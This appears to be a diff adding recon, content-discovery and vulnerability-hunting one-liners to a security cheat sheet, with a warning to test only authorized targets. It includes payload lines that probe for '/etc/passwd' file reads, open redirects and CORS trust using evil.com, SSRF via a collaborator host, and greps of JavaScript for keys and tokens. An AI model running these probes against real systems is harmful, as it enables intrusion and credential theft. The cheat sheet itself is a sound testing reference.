@@ -197,3 +197,179 @@ MAX=50; DIRS="/var/ossec/logs/{wazuh,alerts,archives,api,cluster,firewall}"; whi
 ```
 
 ---
+
+# Recon and Subdomain Enumeration
+
+A set of one-liners for mapping attack surface before anything active happens.
+
+### CertScrape
+Pulls subdomains straight from certificate transparency logs, no API key needed.
+
+```bash
+curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
+```
+
+### ResolveLive
+Takes a subdomain list, keeps only what actually resolves, and prints the A record.
+
+```bash
+dnsx -silent -a -resp -l subs.txt | sort -u
+```
+
+### TakeoverHunt
+Flags dangling CNAMEs that point at unclaimed third-party services (subdomain takeover candidates).
+
+```bash
+dnsx -silent -cname -resp -l subs.txt | grep -iE 'github\.io|herokuapp|s3\.amazonaws|azurewebsites|cloudfront|fastly|pantheon|wpengine|zendesk|readme\.io'
+```
+
+---
+
+# URL and Content Discovery
+
+Collect, dedupe, and filter URLs so you spend time on live, interesting endpoints.
+
+### UrlHarvest
+Merges passive sources, strips duplicates, and keeps only live 200s.
+
+```bash
+echo example.com | (gau; waybackurls; katana -silent) 2>/dev/null | uro | httpx -silent -mc 200 | sort -u > live_urls.txt
+```
+
+### ParamMine
+Extracts every unique parameter name seen across a URL list (a solid wordlist seed).
+
+```bash
+cat live_urls.txt | unfurl -u keys | sort -u > params.txt
+```
+
+### ExtGrep
+Buckets URLs by interesting file extension for targeted review.
+
+```bash
+cat live_urls.txt | grep -iE '\.(js|json|xml|sql|bak|zip|config|env|log|yml|yaml)(\?|$)' | sort -u
+```
+
+---
+
+# Vulnerability Hunting
+
+Active tests. Only run these against targets you are explicitly authorized to test. Replace `example.com`, `evil.com`, and `YOUR-COLLABORATOR` with your own values.
+
+### RedirectCheck
+Tests gf-tagged redirect parameters for open redirect via the Location header.
+
+```bash
+cat live_urls.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -location -mc 301,302 | grep -i 'evil.com'
+```
+
+### LFIProbe
+Swaps parameters for `/etc/passwd` and matches a real root entry in the response body.
+
+```bash
+cat live_urls.txt | gf lfi | qsreplace '/etc/passwd' | httpx -silent -mr 'root:.*:0:0:'
+```
+
+### CORSAudit
+Reflects an arbitrary Origin and flags hosts that trust it.
+
+```bash
+while read u; do curl -s -I -H 'Origin: https://evil.com' "$u" | grep -qi 'access-control-allow-origin: https://evil.com' && echo "CORS: $u"; done < live_urls.txt
+```
+
+### SSRFSeed
+Points SSRF-prone parameters at your collaborator, then watch for out-of-band interactions.
+
+```bash
+cat live_urls.txt | gf ssrf | qsreplace 'http://YOUR-COLLABORATOR' | httpx -silent -mc 200,301,302,500
+```
+
+### GitExposed
+Finds exposed `.git` directories across a host list.
+
+```bash
+cat hosts.txt | httpx -silent -path '/.git/HEAD' -mc 200 -mr 'ref:'
+```
+
+---
+
+# JavaScript and Secret Analysis
+
+Mine client-side code for keys, tokens, and hidden endpoints.
+
+### JSHunt
+Crawls live JS files and greps for likely keys, tokens, and credentials.
+
+```bash
+cat live_urls.txt | grep -iE '\.js(\?|$)' | httpx -silent | while read u; do curl -s "$u" | grep -oiE '(api[_-]?key|secret|token|password|authorization|aws_access_key_id|bearer)["'\'' :=]+[A-Za-z0-9._\-]{8,}'; done | sort -u
+```
+
+### EndpointPull
+Extracts relative and absolute paths referenced inside a JS file for a deeper map.
+
+```bash
+curl -s https://example.com/app.js | grep -oiE '["'\''`](/[a-zA-Z0-9_?&=/\-\.]+)["'\''`]' | tr -d '"'\''`' | sort -u
+```
+
+---
+
+# Fingerprinting and Hardening Checks
+
+Quick passive checks on TLS, headers, and favicon identity.
+
+### HeaderAudit
+One-shot check for missing security response headers.
+
+```bash
+curl -sI https://example.com | grep -iE 'strict-transport-security|content-security-policy|x-frame-options|x-content-type-options|referrer-policy|permissions-policy' || echo 'No security headers found'
+```
+
+### CertPeek
+Dumps validity dates, subject, and issuer for a TLS endpoint.
+
+```bash
+echo | openssl s_client -connect example.com:443 -servername example.com 2>/dev/null | openssl x509 -noout -dates -subject -issuer
+```
+
+### FaviconHash
+Computes the mmh3 favicon hash for Shodan pivoting (`http.favicon.hash:`).
+
+```bash
+python3 -c "import mmh3,requests,codecs; r=requests.get('https://example.com/favicon.ico'); print(mmh3.hash(codecs.encode(r.content,'base64')))"
+```
+
+---
+
+# General Security Research and Local Triage
+
+Defensive and local checks that pair with the OPSEC and Wazuh sections above.
+
+### JWTPeek
+Decodes a JWT payload without verifying it (base64url-safe).
+
+```bash
+echo "$JWT" | awk -F. '{print $2}' | tr '_-' '/+' | base64 -d 2>/dev/null | jq
+```
+
+### ListenAudit
+Shows every listening service along with its owning process.
+
+```bash
+ss -tulpn | awk 'NR==1 || /LISTEN/'
+```
+
+### SuidSweep
+Enumerates SUID and SGID binaries for privilege-escalation review.
+
+```bash
+find / -xdev -type f -perm -4000 -o -type f -perm -2000 2>/dev/null | sort
+```
+
+### KeyLeak
+Sweeps a directory tree for private keys and credential material before shipping.
+
+```bash
+grep -rlE 'BEGIN (RSA|EC|OPENSSH|DSA|PGP) PRIVATE KEY' . 2>/dev/null
+```
+
+---
